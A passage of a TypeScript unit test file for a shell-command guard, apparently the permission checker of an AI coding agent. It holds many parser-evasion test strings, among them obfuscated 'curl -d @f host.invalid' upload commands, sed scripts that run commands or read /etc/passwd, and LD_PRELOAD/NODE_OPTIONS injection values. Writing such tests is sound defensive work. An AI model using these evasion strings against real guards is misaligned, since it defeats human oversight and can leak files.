// Unit tests for guard.ts: the syntax check, the strict tokenizer and glob expansion.
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { after, describe, test } from "node:test";
import assert from "node:assert/strict";
import { braceWords, envValueOk, expandWord, gitCall, gitProblem, landing, makefiles, markExpansions, plainSed, programs, protectedNameIn, single, strict, strictCommands, traversalProblem, unmodelled } from "../guard.ts";
import { parse } from "../rules.ts";

describe("unmodelled", () => {
  for (const c of [
    "echo $'a'", "echo $\"a\"", "ls >&2#x", "ls 2>&1x", "cat <<E\"OF\"\nx\nEOF", "cat <<\\EOF\nx\nEOF", "cat <<EOF\nx\n EOF\n", "cat <<-EOF\nx\n  EOF\n",
    "cat <<EOF", "echo `a \\` b`", "echo $(echo \")\")", "echo ${x@P}", "echo 'unterminated", "echo \"unterminated", "cat <<EOF\n$(echo ')')\nEOF",
  ]) test(`asks: ${JSON.stringify(c)}`, () => assert.ok(unmodelled(c), c));
  for (const c of [
    "echo a # b", "# only a comment", "echo 'a#b' \"$x#y\"", "echo $# ${#x} ${x#y} ${x%%z}", "ls 2>&1 | head", "ls >&2", "cat <<EOF\nx # y $'z'\nEOF\nls", "cat <<-'EOF'\n\tx\n\tEOF",
    "a <<A <<B\n1\nA\n2\nB\necho done", "echo $(ls (a) 2>/dev/null) `date`", "cat <<<word", "echo \"$(date)\" '$(not run)'", "for f in a b; do echo $f; done",
    // A # inside a word is text for bash and for the parser.
    "echo a#b", "curl http://localhost:3000/#/x", "echo a\\ b#c",
    // Plain forms inside ${...} and arithmetic.
    "echo ${VAR:-default} ${1:-x} \"${arr[@]}\" ${#arr[@]} ${arr[0]} ${x//\\//_} ${x:2:3} ${x: -1} ${x^^} \"${x:-a b}\" ${x:-$(date)}", "i=1; a=2; b=3; n=4; echo $((i+1)) $(( (a + b) * 2 )) $((10#$n))",
    "for ((i=0; i<3; i++)); do echo $i; done", "count=0; (( count++ ))", "mkdir -p src/{a,b} && cp f{,.bak} && ls *.{ts,tsx}", "grep -r --include=*.{ts,tsx} x . --exclude-dir={a,b}",
    // Nested shells whose command is literal.
    "bash -c 'npm test'", "bash -c \"npm test && echo done\"", "sh -c 'echo $HOME; for f in *.ts; do echo \"$f\"; done'", "bash scripts/run.sh \"$ARG\"", "eval 'ls -la'",
    "cat <<EOF\nit's $(date) and ${HOME}\nEOF", "git commit -m \"$(cat <<'EOF'\nfix: a thing (#12)\n\nIt's done.\nEOF\n)\"",
  ]) test(`reads: ${JSON.stringify(c)}`, () => assert.equal(unmodelled(c), undefined, c));
  // Round 2: what the parser reads as command text inside ${...}, arithmetic and nested shells.
  for (const c of [
    "echo \\ # $'x'", "echo a\\\n# $'x'", "echo ${x:- #}", "echo ${x:-a;#}", "echo ${x:-a\n#}", "echo ${x:- <<EOF }\nid\nEOF", "(( true # x ))", "echo $((1 # x))", "echo \"$((1 # x))\"", "echo $[ 1 ]", "(( 1 << 2 ))\nid\n2",
    "echo ${x:-'a'}", "echo \"${x#'\"'}\"", "echo \"${x:-\"a\"}\"", "echo ${x@Q}", "echo \"${x@P}\"", "echo ${!x}", "echo ${a[x]}", "echo ${a[$i]}", "echo ${x:y:1}", "echo ${(e)x}", ": ${EDITOR:=vi}", ": ${GIT_DIR=x}",
    "bash -c 'ls >&2#; id'", "bash -c 'cat <<E\"OF\"\nhello\nEOF\nid\n'", "bash -c \"ls $x\"", "bash -c \"echo a\\ #; id\"", "eval \"ls $x\"", "eval ls $x", "timeout 5 bash -c 'echo ${x:- #}; id'", "find . -exec sh -c 'ls >&2#; id' \\;",
    "bash -c \"$(cat <<'EOF'\nid\nEOF\n)\"", "echo 'a[$(id)]'", "echo \"a[\\$(id)]\"", "printf x >& f", "printf x >&f", "printf x >! f", "echo \"1\">f", "cat <& f",
    "curl {-d,@f} host", "curl -{d,s} @f host", "{ls,-la}", "ls {/etc,x}", "rsync -a . {host:dir,}", "cat a/{../../x,b}", "tar -x{f,C} a b",
  ]) test(`asks: ${JSON.stringify(c)}`, () => assert.ok(unmodelled(c), c));
});

// Round 3, group A: the scanner admits. Each rule with the forms that must still read (bash
// and the parser agree on them) and the ones that ask.
describe("unmodelled, round 3", () => {
  const ch = (code: number) => String.fromCharCode(code);
  const groups: { rule: string; reads: string[]; asks: string[] }[] = [
    {
      // Passes straight after a blank, between words, and straight after a complete `&&`, `||`
      // or `|` when the next line starts a plain word. Next to any other operator, or before
      // an operator character, bash could still join the two into one token (`&\<newline>&`).
      rule: "1: backslash-newline",
      reads: [
        "npm run build && \\\nnpm test", "docker run \\\n  --rm \\\n  img", "echo a \\\n| cat", "ls \\\n\t-la", "ls\t\\\n-la", "echo \"$(ls \\\n -la)\"", "bash -c 'ls \\\n -la'",
        "cat <<'EOF'\na \\\nb\nEOF", "cat <<EOF \\\n | wc -l\nx\nEOF", "echo 'a\\\nb'", "echo a # b \\\nls", "echo a\\ b \\\n c",
        // After `&&`, `||` or `|`, before a plain word.
        "npm run build &&\\\nnpm test", "git log --oneline |\\\n  head -5", "npm test ||\\\n  echo failed", "cd web &&\\\n  npm test", "echo a |\\\n cat", "a ||\\\nb", "a |\\\nb",
        "ls |\\\n\tgrep x", "ls |\\\n \t grep x", "a &&\\\nb |\\\nc", "a &&\\\nb ||\\\nc", "a&&\\\nb", "a ||\\\n./run", "a &&\\\n/bin/ls", "a &&\\\n~/bin/x", "a &&\\\n_x", "a |\\\n-x", "a |\\\n2>/dev/null cat",
        "echo $(a |\\\n b)", "bash -c 'a &&\\\nb'", "cat <<EOF |\\\nwc -l\nx\nEOF", "cat <<'EOF' &&\\\nls\nx\nEOF", "[[ -f x ]] &&\\\nls", "[[ a ||\\\nb ]]", "if a; then b |\\\n c; fi",
      ],
      asks: [
        "echo a\\\nb", "echo \"a \\\n b\"", "echo $\\\n(id)", "echo \"$\\\n(id)\"", "cat <\\\n<EOF\nx\nEOF", "(\\\n( 1 ))", "echo $\\\n{x}", "echo $\\\n'x'",
        "cat <<EOF\nEO\\\nF\nid\nEOF", "cat <<EOF\na \\\nb\nEOF", "cat <<EOF\nx\\\nEOF\nid\nEOF", "cat <<E\\\nOF\nx\nEOF", "curl \"-\\\nd\" x", "echo `ls \\\n-la`", "echo ${x:-a \\\nb}", "echo $(( 1 \\\n+ 1 ))",
        "echo \\\n\\\nid", "\\\nls", "ls;\\\nid", "echo a\\ \\\nb", "echo a\\", "bash -c 'echo a\\'",
        // After an operator other than a complete `&&`, `||` or `|`.
        "a &\\\nb", "a &\\\n& b", "a ;\\\nb", "a |&\\\nb", "a >\\\nb", "a <\\\nb", "a >|\\\nb", "a &>\\\nb", "a 2>&1|&\\\nb", "(\\\nls)", "a $(\\\nls)", "a ;;\\\nb",
        // Before something that is not a plain word.
        "a &&\\\n&b", "a &&\\\n|b", "a |\\\n|b", "a |\\\n&b", "a ||\\\n|b", "a |\\\n;b", "a &&\\\n<f b", "a &&\\\n>f b", "a &&\\\n'b'", "a &&\\\n\"b\"", "a &&\\\n#b\nc", "a &&\\\n(b)",
        "a &&\\\n{ b; }", "a &&\\\n$b", "a &&\\\n`b`", "a &&\\\n\\\nb", "a &&\\\n \\\nb", "a &&\\\n\\b", "a &&\\\n\nb", "a &&\\\n", "a &&\\\n  ", "a &&\\\n!b", "a &&\\\n*", "a &&\\\n=b", "a |\\\n@b", "a |\\\n%b",
        // Inside a word, quotes, substitutions and heredocs.
        "echo a|b\\\nc", "echo \"a &&\\\nb\"", "echo `a |\\\nb`", "echo ${x:-a |\\\nb}", "echo $(( 1 ||\\\n2 ))", "cat <<EOF\na |\\\nb\nEOF", "cat <<EOF |\\\n\nx\nEOF", "bash -c \"a &&\\\nb\"",
        "[[ a |\\\nb ]]", "i=0 &&\\\n(( i++ ))",
      ],
    },
    {
      rule: "2: control characters and Unicode line separators",
      reads: ["echo 'tab\there'", "printf 'a\\tb\\n'", `echo "caf${ch(0xe9)}" caf${ch(0xe9)}`, `echo 'a${ch(0xa0)}b'`],
      asks: [
        "echo a\rb", "echo 'a\rb'", "echo \"a\rb\"", "cat <<'EOF'\nx\rEOF\nEOF", "cat <<EOF\nx\rEOF\necho '\nEOF\nid #'", `cat <<EOF\nx${ch(0x2028)}EOF\nEOF`, `echo "${ch(0x2029)}"`, `echo ${ch(0x1b)}[0m`,
        `echo 'a${ch(0)}'`, `echo a${ch(0x0b)}b`, `echo a${ch(0x0c)}b`, `echo ${ch(0x7f)}`, `echo ${ch(0x85)}`, `# a comment${ch(0x0d)}`, `echo a${ch(0xa0)}b`, `echo a${ch(0x3000)}b`,
      ],
    },
    {
      rule: "3: >& and <& are not arithmetic",
      reads: ["i=1; (( i > 2 && i < 5 ))", "i=1; echo $(( i >= 2 ))", "i=1; (( i >>= 1 ))", "i=1; echo $(( i & 3 | 4 ))", "echo $(( 1 > 2 ))"],
      asks: ["(( 1 >&2 ))", "(( 1 >&2# x ))", "echo $(( 1 >&-# x ))", "echo $(( 1 <&3 ))", "(( 1 &> 2 ))", "echo \"$(( 1 >&2 ))\"", "(( 1 # x ))", "(( 1#2 # x ))"],
    },
    {
      rule: "4: extglob, [[ ]] and options that change how bash reads",
      reads: [
        "[[ -f x ]] && echo y", "[[ \"$a\" == \"b\" ]] || exit 1", "if [[ -n $x && -d dir ]]; then ls; fi", "[[ $x =~ ^[0-9]+$ ]]", "[[ a < b ]]", "[[ a == b ]];ls", "[[ a == b ]]\nls", "( [[ -d x ]])",
        "set -euo pipefail", "set -e", "set +e", "set -o pipefail", "set -- a b", "set -- \"$@\"", "bash -lc 'ls'", "bash -euo pipefail -c 'ls'", "sh -ec 'ls'", "bash --norc --noprofile -c 'ls'",
        "echo a*b ?x [ab]", "f() { ls; }", "ls *.ts", "echo $(( 2 *(3+4) ))", "( ls )", "! true", "echo 'shopt -s extglob'", "grep -n shopt f", "echo \"@(a|b)\"",
      ],
      asks: [
        "shopt -s extglob", "shopt -u nullglob", "shopt", "command shopt -s extglob", "if shopt -q extglob; then ls; fi", "echo $(shopt -s extglob)", "bash -c 'shopt -s extglob'",
        "bash -O extglob -c 'ls'", "bash +O extglob -c 'ls'", "bash -cO extglob 'ls'", "bash -Oc extglob 'ls'", "sh -O extglob -c ls", "timeout 5 bash -O extglob -c ls", "bash -O extglob script.sh",
        "echo @(a|b)", "ls !(x)", "echo +(a)", "echo *(a)", "echo ?(a)", "x=@(a|b)", "echo a@(b| #)", "case x in @(x| #) ) ;; esac", "if !(true); then :; fi",
        "[[ x == @(a|b) ]]", "[[ x == !(a| #) ]]", "[[ x =~ (a|b) ]]", "[[ x =~ (a| #) ]]", "[[ ( a == b ) ]]", "[[ a == b", "[[ a == b\n]]", "[[ a == b ; ]]", "[[ a =~ a|b ]]",
        "set -H", "set -o history", "set -o histexpand", "set -eH", "set -k", "set -o posix", "set $opts", "set -$x", "builtin set -H",
        "bash -i -c 'ls'", "bash -ic 'ls'", "bash --posix -c ls", "bash -o posix -c ls", "bash -H -c ls", "bash -s -c ls", "bash $opts -c ls", "bash build.sh -c true",
      ],
    },
    {
      rule: "5: an expansion and a brace expansion in one word",
      reads: ["echo $x {a,b}", "mkdir -p src/{a,b}", "echo ${x}", "find . -exec echo $x{} \\;", "echo \"$x{a,b}\"", "echo '$x'{a,b}", "echo $x{a}", "cp f{,.bak}"],
      asks: [
        "echo $e{a,b}", "echo ${e}{a,b}", "echo \"$e\"{a,b}", "echo $(true){a,b}", "echo `true`{a,b}", "echo {a,$x}", "cp \"$f\"{,.bak}", "echo <(true){a,b}", "echo $1{a,b}", "echo $@{a,b}", "echo {1..3}$x",
        "find build $e{-delete,}", "find . {${e}-delete,}", "echo ${e:-}{a,b}", "echo {a,b}\"$x\"",
      ],
    },
    {
      // A name passes when the command sets it to a plain integer before the use, where every
      // run reaches the assignment, and names it nowhere else in a way that could give it text.
      rule: "6: variables in arithmetic",
      reads: [
        "i=0; (( i++ ))", "i=0; echo $((i+1))", "n=3; for ((i=0; i<n; i++)); do echo $i; done", "i=0; while [ $i -lt 3 ]; do i=$((i+1)); done; echo \"$i\"", "(( i = 5 )); echo $(( i * 2 ))",
        "i=2; echo ${x:i} ${x:1:i} ${x: -1} ${a[i]} ${a[$i]} ${a[@]:i}", "i=0; a[i]=1", "i=1; [[ $i -eq 1 ]]", "i=1; [[ i -lt 2 && \"$i\" -ge 0 ]]", "[[ $# -eq 0 ]]", "echo $(( $# + 1 )) $(( ${#x} + $? ))",
        "bash -c 'i=0; (( i++ ))'", "echo $((1+2)) $((0x1f)) $((16#ff))", "i=0\nj=-1\n(( i += j ))", "i=0 && (( i ))", "count=0; for f in a b; do (( count++ )); done; echo $count", "i=0; echo $(echo $(( i + 1 )))",
      ],
      asks: [
        "(( i++ ))", "echo $((i+1))", "(( ls ))", "i=x; (( i ))", "i=0; i=x; (( i ))", "i=0; (( i )); i=x", "i=0; i+=x; (( i ))", "i=0; i=$(cat f); (( i ))", "i=0; read i; (( i ))", "i=0; read -r line; (( i ))",
        "for i in 1 2; do (( i )); done", "i=0; for i in a; do :; done; (( i ))", "i=0; printf -v i %s x; (( i ))", "i=0; mapfile i; (( i ))", "i=0; local i=x; (( i ))", "i=0; export i; (( i ))",
        "i=0; declare -n r=i; r=x; (( i ))", "( i=0 ); (( i ))", "true && i=0; (( i ))", "i=0 | cat; (( i ))", "i=0 & (( i ))", "if true; then i=0; fi; (( i ))", "{ i=0; }; (( i ))", "(( i )); i=0", "i=0 true; (( i ))",
        "echo $(i=0); (( i ))", "I=0; (( I ))", "_=0; (( _ ))", "i=0; echo \"i\"; (( i ))", "i=0; (( i + $1 ))", "i=0; (( i + $(cat f) ))", "i=0; (( i + `cat f` ))", "i=0; (( a[i] ))", "i=0; : ${i:=x}; (( i ))",
        "i=0; r''ead i; (( i ))", "i=0; $cmd; (( i ))", "i=0; r{ea,}d x; (( i ))", "i=0; eval x; (( i ))", "i=0; . ./f; (( i ))", "i=0; bash -c '(( i ))'", "i=0; unset i; (( i ))", "i=0; i[0]=x; (( i ))",
        "x=y; echo ${a[x]}", "echo ${x:y}", "echo ${x:0:y}", "echo ${a[1+1]}", "a[x]=1", "a=([x]=1)", "a[b[0]]=1", "[[ $x -eq 1 ]]", "[[ x -lt 1 ]]", "[[ 1 -ge \"$(cat f)\" ]]", "[[ -v x ]]",
        "i=0; echo $(( ${i:-1} ))", "i=0; echo $(( $i$j ))", "(( x = y ))",
      ],
    },
    {
      rule: "item 3: a nested shell that is not bash, sh or dash",
      reads: ["bash -c ls", "sh -c ls", "dash -c ls", "timeout 5 bash -c 'ls -la'", "zsh --version", "which zsh", "zsh script.zsh", "grep -c zsh f"],
      asks: [
        "zsh -c 'ls'", "zsh -c '{ ls } always { id }'", "ksh -c ls", "timeout 5 zsh -c ls", "env zsh -c ls", "env -i X=1 zsh -c ls", "xargs zsh -c ls", "/usr/bin/zsh -c ls", "zsh -fc ls", "zsh -o extendedglob -c ls",
        "fish -c ls", "mksh -c ls", "ksh93 -c ls", "csh -c ls", "bash -c 'zsh -c ls'", "sudo ksh -c ls", "find . -exec zsh -c ls \\;", "z''sh -c ls", "nohup nice zsh -c ls", "eval zsh -c ls",
      ],
    },
    {
      // Found by the trace oracle at 20,000 inputs: bash runs these words as programs; the
      // rules read them without their quotes, as an assignment or a keyword, and drop them.
      rule: "a command name the rules drop",
      reads: ["FOO=bar ls", "env \"FOO=bar\" ls", "docker run -e \"FOO=bar\" img", "make \"CC=gcc\"", "grep -rn \"function\" f", "echo \"if\" \"{\"", "time ls", "{ ls; }", "timeout 5 ls", "command -v ls"],
      asks: ["\"x=/a\"", "x\\=/a", "\\x=/a", "y=1 \"x=/a\" b", "if \"x=/a\"; then :; fi", "nice x=/a", "timeout 5 x=/a", "command x=/a", "exec x=/a", "nohup nice -n 5 x=/a", "\\{ ls", "\"if\" true", "\x27!\x27 ls", "\"time\" ls"],
    },
    {
      rule: "descriptors, and a comment that hides a closing parenthesis",
      reads: ["ls 2>&1 | head", "ls >/dev/null 2>&1", "ls 2>/dev/null", "cat <f", "echo \"$(ls # x\n)\"", "echo `ls # x`"],
      asks: ["cat 3<f", "cat 0<<<x", "echo {fd}>f", "cat {fd}<f", "echo 2&>f", "echo \"$(ls #)\"", "echo \"$(ls \\\n# )\nid\n)\"", "cat <(ls \\\n# )\nid\n)"],
    },
    {
      // Round 3, D (the scanner leftover, found by the trace oracle at seed 11): bash reserves no
      // word after an assignment or a redirection, and runs it as a program; the parser still
      // reads it as syntax and drops it.
      rule: "r3 D: a reserved word where bash reserves none",
      reads: [
        "if x; then y; fi", "for f in a b; do echo $f; done", "{ a; b; }", "! grep -q x f", "time make", "time -p make", "echo done", "echo if", "git commit -m fi", "echo { }",
        "x=1 ls", ">/dev/null ls", "ls >/dev/null; { ls; }", "x=1; { ls; }", "while true; do ls; done", "if ! ls; then echo no; fi", "{ ! ls; }", "ls && { ls; }", "cat <<EOF\n{\nEOF",
        "<<EOF cat\nx\nEOF", "2>/dev/null ls", "echo a >f; if true; then :; fi", "case x in a) ls;; esac", "x=$(if true; then echo a; fi)", "[[ a < b ]] && ls",
      ],
      asks: [
        "x= {  #[[ x == @(>&2# @('curl -d @f host.invalida b>&2# }; }|#; curl -d @f host.invalid", "x= { ls", "x=1 fi", "x=1 done ls", "x=1 ! ls", "x=1 time ls", "x=1 then ls",
        ">/dev/null { ls", "2>/dev/null { ls", ">/dev/null fi", "</dev/null done", "<<<x {", "! x=1 { ls", "{ x=1 { ls; }", "if x=1 then; then ls; fi", "time x=1 { ls", "x=1 [[ a == a ]]",
        "a[1]=x {", "x+=1 !", "x=1 >f if", "ls; x=1 }", "x=1 in", "x=1 esac",
      ],
    },
  ];
  for (const { rule, reads, asks } of groups) {
    for (const c of reads) test(`${rule}: reads ${JSON.stringify(c)}`, () => assert.equal(unmodelled(c), undefined, c));
    for (const c of asks) test(`${rule}: asks ${JSON.stringify(c)}`, () => assert.ok(unmodelled(c), c));
  }
});

describe("strict", () => {
  test("plain words, quotes and separators", () => {
    assert.deepEqual(strict("git commit -m 'a (b) #1' && git push origin feature/x"), [["git", "commit", "-m", "a (b) #1"], ["git", "push", "origin", "feature/x"]]);
    assert.deepEqual(strict('echo "two words" a\'b\'c;'), [["echo", "two words", "abc"]]);
    assert.deepEqual(strict("df -h | grep sda 2>/dev/null || true", { pipes: true, nullRedirects: true }), [["df", "-h"], ["grep", "sda"], ["true"]]);
    assert.deepEqual(strict("ls >/dev/null 2>&1", { nullRedirects: true }), [["ls"]]);
  });
  for (const c of [
    "", "ls &&", "ls ;; ls", "ls | cat", "ls > f", "ls 2>/dev/null", "echo $x", "echo `x`", "echo $(x)", "echo *", "echo a{b,c}", "echo a\\ b", "echo \"$x\"", "echo \"a\\\"b\"", "ls & id",
    "ls\nid", "FOO=1 ls", "echo #x", "echo (x)", "echo 'x", "ls <f", "echo !x", "ls >/dev/nullx",
  ]) test(`refuses: ${JSON.stringify(c)}`, () => assert.equal(strict(c), undefined));
  test("null redirects only where asked for, and only to /dev/null", () => {
    assert.equal(strict("ls > /tmp/x", { nullRedirects: true }), undefined);
    assert.equal(strict("ls 2>&3", { nullRedirects: true }), undefined);
  });
});

describe("single", () => {
  const work = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "automode-single-")));
  fs.mkdirSync(path.join(work, "sub", "deep"), { recursive: true });
  fs.mkdirSync(path.join(work, "elsewhere", "inner"), { recursive: true });
  fs.symlinkSync(path.join(work, "elsewhere", "inner"), path.join(work, "link"));
  fs.mkdirSync(path.join(work, "~", "work"), { recursive: true });
  after(() => fs.rmSync(work, { recursive: true, force: true }));
  test("one command, after cd and under timeout", () => {
    assert.deepEqual(single("cd sub && timeout 15 ssh lab uptime", work), { dir: path.join(work, "sub"), argv: ["ssh", "lab", "uptime"], texts: ["timeout 15 ssh lab uptime", "ssh lab uptime"] });
    assert.equal(single("cd", work), undefined);
    assert.equal(single("cd a b && ls", work), undefined);
    assert.equal(single("ls && cd x", work), undefined);
    assert.equal(single("ls; id", work), undefined);
    assert.equal(single("cd ~root && ls", work), undefined);
  });
  // Finding 14: the directory that is checked must be the one bash ends up in.
  test("14: cd grants nothing unless bash runs the command there or not at all", () => {
    assert.equal(single("cd sub; ls", work), undefined, "after `;` a failed cd still runs the command");
    assert.equal(single("cd nope && ls", work), undefined, "a directory that does not exist");
    assert.equal(single(`cd ${work}/nope/.. && ls`, work), undefined, "bash refuses a path through a missing directory");
    assert.equal(single("cd link/.. && ls", work), undefined, "`..` after a symbolic link: bash and the kernel disagree");
    assert.equal(single("cd sub/deep/.. && ls", work)?.dir, path.join(work, "sub"));
    assert.equal(single("cd link && ls", work)?.dir, path.join(work, "elsewhere", "inner"), "the real directory is what gets checked");
    assert.equal(landing(work, "link/.."), undefined);
    assert.equal(landing(work, "sub"), path.join(work, "sub"));
  });
  // Finding 15: bash does not expand a quoted tilde.
  test("15: a quoted ~ grants nothing", () => {
    assert.equal(single("git -C '~/work' fetch origin", work), undefined);
    assert.equal(single('git -C "~/work" fetch origin', work), undefined);
    assert.equal(single("cd '~/work' && git fetch", work), undefined);
    assert.ok(single("git -C sub fetch origin", work));
    assert.deepEqual(strictCommands("cd a && ls; id")?.map((c) => c.before), [undefined, "&&", ";"]);
  });
  // Round 3, finding 7: bash expands a leading `~` only when it is unquoted up to the first
  // unquoted `/` (probed in bash 5.2: `~'/x'`, `~"/x"`, `''~/x`, `~'/'x` all stay `~/x`), turns
  // `~+`, `~-` and `~user` into other directories, and expands `~` after `=` and `:` in a word
  // shaped like an assignment (`a=~/x`, `a=b:~/x`).
  const tildeWord = (c: string) => strictCommands(c)?.some((x) => x.quotedTilde);
  for (const c of [
    "git -C ~'/work' fetch origin",
    'git -C ~"/work" fetch origin',
    "git -C ''~/work fetch origin",
    'git -C ""~/work fetch origin',
    "git -C ~'/'work fetch origin",
    "git -C ~\"\"/work fetch origin",
    "cd ~'/work' && git fetch",
    "cd ''~/work && git fetch",
    "git -C ~+/sub fetch origin",
    "git -C ~- fetch origin",
    "git -C ~root fetch origin",
    "git -C a=~/work fetch origin",
    "git -C a=b:~/work fetch origin",
    "git -C x:~/work fetch origin",
  ]) {
    test(`r3 7: grants nothing: ${c}`, () => {
      assert.ok(tildeWord(c), c);
      assert.equal(single(c, work), undefined);
    });
  }
  for (const c of ["git -C ~/work fetch origin", "git -C ~/'work' fetch origin", "git -C ~ fetch origin", "git log HEAD~1", "git push origin HEAD~1:feature/x", "git commit -m 'a ~ b'"]) {
    test(`r3 7: an ordinary ~: ${c}`, () => assert.equal(tildeWord(c), false, c));
  }
});

describe("braces and sed scripts", () => {
  test("brace words", () => {
    assert.deepEqual(braceWords("a{b,c}d"), ["abd", "acd"]);
    assert.deepEqual(braceWords("{a,b}{1,2}"), ["a1", "a2", "b1", "b2"]);
    assert.deepEqual(braceWords("x{}y{a}"), ["x{}y{a}"]);
    assert.equal(braceWords("{1..5}"), undefined);
  });
  for (const script of ["s/a/b/", "s/a/b/g", "s|a/b|c|", "1,5p", "/foo/d", "$d", "5q", "/a/,/b/p", "s/a/b/;s/c/d/g", "1!G", "y/abc/xyz/", "/^#/d"]) test(`plain sed: ${script}`, () => assert.ok(plainSed(script)));
  for (const script of ["1e id", "e id", "s/a/b/e", "s/a/b/ge", "s/a/b/w out", "w out", "1r /etc/passwd", "2i text", "/x/{e id\n}", "s/a/b/;1e id", "1{s/.*/id/ep}"]) test(`not plain sed: ${script}`, () => assert.ok(!plainSed(script)));
});

describe("git calls", () => {
  test("global options come from an allowlist", () => {
    assert.deepEqual(gitCall(["-C", "x", "--no-pager", "-c", "user.name=a", "log", "-1"]), { dirs: ["x"], sub: "log", rest: ["-1"] });
    for (const words of [["--namespace", "status", "push"], ["--git-dir=.git", "status"], ["-c", "core.pager=x", "log"], ["--exec-path=/x", "status"], ["-p", "log"], ["--config-env=a=b", "log"]])
      assert.equal(typeof gitCall(words), "string", words.join(" "));
  });
  test("found wherever the word git is", () => {
    for (const c of ["xargs git --namespace status push", "echo $(git --namespace a b)", "env X=1 git --work-tree=/ status", "sh -c \"git --namespace status push\"", "git fetch --upload-pac=x ."])
      assert.ok(gitProblem(c), c);
    for (const c of ["git status", "git commit -m 'use git status'", "grep -r git .", "git log --exclude=x"]) assert.equal(gitProblem(c), undefined, c);
    // The price of reading quoted text as a possible command: a message that spells out a git
    // option asks.
    assert.ok(gitProblem("git commit -m 'git --amend is handy'"));
  });
});

describe("expandWord", () => {
  const dir = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "automode-glob-")));
  for (const f of [".env", ".env.local", "a.txt", "b.txt", "sub/c.pem"]) {
    fs.mkdirSync(path.dirname(path.join(dir, f)), { recursive: true });
    fs.writeFileSync(path.join(dir, f), "");
  }
  after(() => fs.rmSync(dir, { recursive: true, force: true }));
  const names = (word: string) => expandWord(word, dir)?.map((p) => path.relative(dir, p)).sort();
  test("globs, braces and dotfiles expand as in bash", () => {
    assert.deepEqual(names(".env*"), [".env", ".env.local"]);
    assert.deepEqual(names(".en?"), [".env"]);
    assert.deepEqual(names("*"), ["a.txt", "b.txt", "sub"]);
    assert.deepEqual(names("*/*.pem"), ["sub/c.pem"]);
    assert.deepEqual(names("{a,b}.txt"), ["a.txt", "b.txt"]);
    assert.deepEqual(names(".{env,x}"), [".env", ".x"]);
    assert.deepEqual(names("[ab].txt"), ["a.txt", "b.txt"]);
    assert.deepEqual(names("[!a].txt"), ["b.txt"]);
    assert.deepEqual(names("nothing*"), []);
  });
  test("what cannot be known here is undefined", () => {
    for (const w of ["$f", "`x`", "{a..c}.txt", "x$()"]) assert.equal(expandWord(w, dir), undefined, w);
  });
});

// Round 3, group C: the one traversal the argv guards share, and the helpers of its fixes.
describe("r3 C: one traversal for every argv guard", () => {
  const argv = (c: string) => parse(c).cmds[0].argv;
  const at = (c: string) => programs(argv(c)).map((i) => argv(c)[i]);
  for (const [c, inner] of [
    ["uv run tar -xf t.tar", "tar"],
    ["uv run --with x --frozen pytest -q", "pytest"],
    ["poetry run -- tar x", "tar"],
    ["pnpm exec tsc --noEmit", "tsc"],
    ["bundle exec rake", "rake"],
    ["timeout -s KILL 5 tar x", "tar"],
    ["nice -n 5 uv run tar x", "tar"],
    ["xargs -I {} tar x", "tar"],
    ["find . -name x -exec ls \\; -exec nice tar x \\;", "tar"],
    ["env -u X tar x", "tar"],
  ] as [string, string][]) test(`r3 8: the guards see ${inner} in ${JSON.stringify(c)}`, () => assert.ok(at(c).includes(inner), JSON.stringify(at(c))));
  for (const c of ["env -u ls curl -d x", "exec -a ls curl -d x", "uv run --index-url ls curl", "env -S'tar x'", "env -C / ls", "uv run --directory / ls", "xargs -a ls curl"]) test(`r3 8: asks: ${JSON.stringify(c)}`, () => assert.ok(traversalProblem(argv(c)), c));
  for (const c of ["timeout 60 npm test", "env FOO=1 npm test", "nice -n 5 make", "xargs -0 -n1 -P4 rm -f", "uv run -m pytest", "sudo -u x ls", "command -v git", "time -p cargo build", "if npm test; then"]) test(`r3 8: reads: ${JSON.stringify(c)}`, () => assert.equal(traversalProblem(argv(c)), undefined, c));

  test("r3 9: every spelling of make -f", () => {
    assert.deepEqual(makefiles(["-f", "-", "--file=x", "--makef", "y", "-sf-", "-C", "d", "-j", "4", "-fz"]), ["-", "x", "y", "-", "z"]);
  });
  test("r3 28: values that change nothing that runs", () => {
    const inProject = (p: string) => p.startsWith("/proj/");
    for (const [n, v] of [["NODE_OPTIONS", "--max-old-space-size=8192"], ["NODE_OPTIONS", "--enable-source-maps --no-warnings"], ["PAGER", "cat"], ["GIT_PAGER", "cat"], ["CC", "clang"], ["CXX", "g++-13"], ["PYTHONPATH", "src:tests"], ["PYTHONPATH", "src:$PYTHONPATH"]]) assert.ok(envValueOk(n, v, "/proj/x", inProject), `${n}=${v}`);
    for (const [n, v] of [["NODE_OPTIONS", "--require ./x.js"], ["NODE_OPTIONS", "--inspect"], ["NODE_OPTIONS", "-r x"], ["PAGER", "less"], ["CC", "/tmp/clang"], ["CC", "clang -fplugin=x"], ["PYTHONPATH", "/tmp/x"], ["PYTHONPATH", "../.."], ["PYTHONPATH", "$X"], ["LD_PRELOAD", "x"], ["PATH", "/usr/bin"]]) assert.ok(!envValueOk(n, v, "/proj/x", inProject), `${n}=${v}`);
    assert.ok(!envValueOk("PYTHONPATH", "src", undefined, inProject), "a relative entry where the directory is unknown");
  });
  test("r3 24: a protected name spelled with braces or a glob", () => {
    const names = [".git", "opencode.json", "AGENTS.md", ".husky"];
    for (const t of ["sub/{.git,x}", "sub/.g[i]t/config", "opencode.jso{n,n}", "x/.gi?/hooks", ".g*t", "AGENTS.m?", ".gi{s..u}"]) assert.ok(protectedNameIn(t, names), t);
    for (const t of ["src/{a,b}", "sub/[.]git", "?git", "notes.md"]) assert.equal(protectedNameIn(t, names), undefined, t);
    // A generic glob is held to what it matches where the command runs.
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "r3-24-"));
    fs.mkdirSync(path.join(dir, "build"));
    fs.writeFileSync(path.join(dir, "build", "out.md"), "");
    for (const t of ["build/*", "*.md", "build/*.md", "sub/*/config", ".*/x"]) assert.equal(protectedNameIn(t, names, dir), undefined, t);
    fs.writeFileSync(path.join(dir, "build", "AGENTS.md"), "");
    assert.equal(protectedNameIn("build/*.md", names, dir), "AGENTS.md");
    fs.mkdirSync(path.join(dir, "sub", ".git"), { recursive: true });
    assert.equal(protectedNameIn("sub/.*/config", names, dir), ".git");
    assert.ok(protectedNameIn("sub/.*/config", names), "with the directory unknown, the pattern decides");
    fs.rmSync(dir, { recursive: true, force: true });
  });
  test("r3 5b: marks every expansion bash performs and nothing else", () => {
    const strip = (s: string) => s.replace(/[\u000e\u000f]/g, "");
